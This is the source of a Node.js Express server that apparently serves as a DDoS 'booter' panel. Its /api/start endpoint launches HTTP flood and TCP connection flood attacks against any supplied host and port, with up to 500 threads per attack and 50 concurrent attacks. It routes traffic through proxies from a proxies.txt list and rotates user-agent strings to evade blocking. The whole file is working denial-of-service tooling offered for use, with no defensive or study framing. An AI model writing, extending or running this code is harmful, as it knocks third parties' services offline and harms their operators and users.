const express = require('express');
const net = require('net');
const http = require('http');
const https = require('https');
const dns = require('dns').promises;
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '5mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-key');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

const ADMIN_KEY = process.env.ADMIN_KEY || 'nyx';
const MAX_CONCURRENT_ATTACKS = 50;
const MAX_THREADS_PER_ATTACK = 500;

const activeAttacks = new Map();
let attackCounter = 0;
let proxies = [];
let proxiesByProtocol = { http: [], https: [], socks4: [], socks5: [] };

function parseProxyLine(line) {
  line = line.trim();
  if (!line || line.startsWith('#')) return null;

  let protocol = 'http';
  let host, port, username, password;

  const protoMatch = line.match(/^(https?|socks[45]):\/\//i);
  if (protoMatch) {
    protocol = protoMatch[1].toLowerCase();
    line = line.replace(/^(https?|socks[45]):\/\//i, '');
  }

  const parts = line.split(':');
  if (parts.length === 2) {
    host = parts[0];
    port = parseInt(parts[1]);
  } else if (parts.length === 4) {
    host = parts[0];
    port = parseInt(parts[1]);
    username = parts[2];
    password = parts[3];
  } else {
    return null;
  }

  if (!host || isNaN(port) || port < 1 || port > 65535) return null;
  return { protocol, host, port, username, password };
}

function loadProxies() {
  try {
    const raw = fs.readFileSync(path.join(__dirname, 'proxies.txt'), 'utf-8');
    proxies = raw.split('\n').map(parseProxyLine).filter(Boolean);
    proxiesByProtocol = { http: [], https: [], socks4: [], socks5: [] };
    for (const p of proxies) {
      if (proxiesByProtocol[p.protocol]) proxiesByProtocol[p.protocol].push(p);
    }
    console.log(`loaded ${proxies.length} proxies (${proxiesByProtocol.http.length} http, ${proxiesByProtocol.socks4.length} socks4, ${proxiesByProtocol.socks5.length} socks5)`);
  } catch (e) {
    console.warn('no proxies.txt — running with direct connections only');
    proxies = [];
  }
}

function randomProxy(protocol) {
  const pool = protocol ? proxiesByProtocol[protocol] : proxies;
  if (!pool || pool.length === 0) return null;
  return pool[Math.floor(Math.random() * pool.length)];
}

function pickUA() {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}

function httpFlood(target, port, duration, threads, useProxy) {
  const start = Date.now();
  const end = start + duration * 1000;
  const isHttps = port === 443;
  const mod = isHttps ? https : http;

  function loop() {
    if (Date.now() > end) return;

    const p = useProxy ? randomProxy(isHttps ? 'https' : 'http') : null;

    if (p) {
      const opts = {
        host: p.host,
        port: p.port,
        path: `http://${target}/`,
        method: 'GET',
        headers: {
          'Host': target,
          'User-Agent': pickUA(),
          'Accept': '*/*',
          'Accept-Encoding': 'gzip, deflate',
          'Connection': 'close',
        },
        timeout: 5000,
      };
      if (p.username) {
        opts.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(`${p.username}:${p.password}`).toString('base64');
      }
      const req = http.request(opts, (res) => res.resume());
      req.on('error', () => {});
      req.setTimeout(4000, () => req.destroy());
      req.end();
    } else {
      const req = mod.request({
        host: target,
        port,
        path: '/',
        method: 'GET',
        headers: {
          'User-Agent': pickUA(),
          'Accept': '*/*',
          'Connection': 'close',
        },
        timeout: 5000,
      }, (res) => res.resume());
      req.on('error', () => {});
      req.setTimeout(4000, () => req.destroy());
      req.end();
    }

    setTimeout(loop, 8);
  }

  for (let i = 0; i < threads; i++) loop();
}

function synFlood(target, port, duration, threads) {
  const start = Date.now();
  const end = start + duration * 1000;

  function loop() {
    if (Date.now() > end) return;
    const sock = net.connect({ host: target, port });
    sock.on('connect', () => {
      sock.write(`GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${pickUA()}\r\nConnection: close\r\n\r\n`);
      setTimeout(() => sock.destroy(), 500);
    });
    sock.on('error', () => sock.destroy());
    sock.setTimeout(3000, () => sock.destroy());
    setTimeout(loop, 40);
  }

  for (let i = 0; i < threads; i++) loop();
}

app.post('/api/resolve', async (req, res) => {
  const { link } = req.body || {};
  if (!link || typeof link !== 'string') {
    return res.status(400).json({ error: 'no link provided' });
  }

  let host = link.trim();
  host = host.replace(/^(https?|socks[45]|ftp):\/\//i, '');
  host = host.split('/')[0].split('?')[0].split('#')[0];
  host = host.split('@').pop();
  host = host.split(':')[0];

  if (!host || !/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: 'could not parse host from link' });
  }

  const isIp = /^\d{1,3}(\.\d{1,3}){3}$/.test(host);
  if (isIp) {
    return res.json({ host, ip: host, addresses: [{ address: host, family: 4 }] });
  }

  try {
    const results = await dns.lookup(host, { all: true });
    const addresses = results.map(r => ({ address: r.address, family: r.family }));
    const primary = addresses.find(a => a.family === 4) || addresses[0];
    return res.json({
      host,
      ip: primary ? primary.address : null,
      addresses,
    });
  } catch (e) {
    return res.status(500).json({ error: `dns lookup failed: ${e.message}`, host });
  }
});

app.post('/api/start', (req, res) => {
  const { target, port, method, duration, threads, useProxy } = req.body || {};

  if (req.headers['x-admin-key'] !== ADMIN_KEY) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  if (!target || !port || !duration) {
    return res.status(400).json({ error: 'missing params' });
  }
  if (activeAttacks.size >= MAX_CONCURRENT_ATTACKS) {
    return res.status(429).json({ error: 'too many attacks running' });
  }

  const id = ++attackCounter;
  const durationSec = Math.min(Math.max(parseInt(duration), 1), 600);
  const threadCount = Math.min(Math.max(parseInt(threads) || 50, 1), MAX_THREADS_PER_ATTACK);

  activeAttacks.set(id, { id, target, method, started: Date.now(), duration: durationSec });

  try {
    if (method === 'http') {
      httpFlood(target, port, durationSec, threadCount, !!useProxy);
    } else if (method === 'syn') {
      synFlood(target, port, durationSec, threadCount);
    } else {
      activeAttacks.delete(id);
      return res.status(400).json({ error: 'unknown method' });
    }
  } catch (e) {
    activeAttacks.delete(id);
    return res.status(500).json({ error: e.message });
  }

  setTimeout(() => activeAttacks.delete(id), durationSec * 1000 + 1000);

  res.json({
    id,
    target,
    method,
    threads: threadCount,
    duration: durationSec,
    proxies: useProxy ? proxies.length : 0,
  });
});

app.get('/api/proxies/count', (req, res) => {
  res.json({
    count: proxies.length,
    http: proxiesByProtocol.http.length,
    https: proxiesByProtocol.https.length,
    socks4: proxiesByProtocol.socks4.length,
    socks5: proxiesByProtocol.socks5.length,
  });
});

app.get('/api/status', (req, res) => {
  res.json({
    running: activeAttacks.size,
    proxies: proxies.length,
    uptime: process.uptime(),
  });
});

app.get('/health', (req, res) => res.json({ ok: true }));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

loadProxies();
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`server up on :${PORT} | admin key: ${ADMIN_KEY === 'nyx' ? 'DEFAULT (change ADMIN_KEY!)' : 'set'}`));
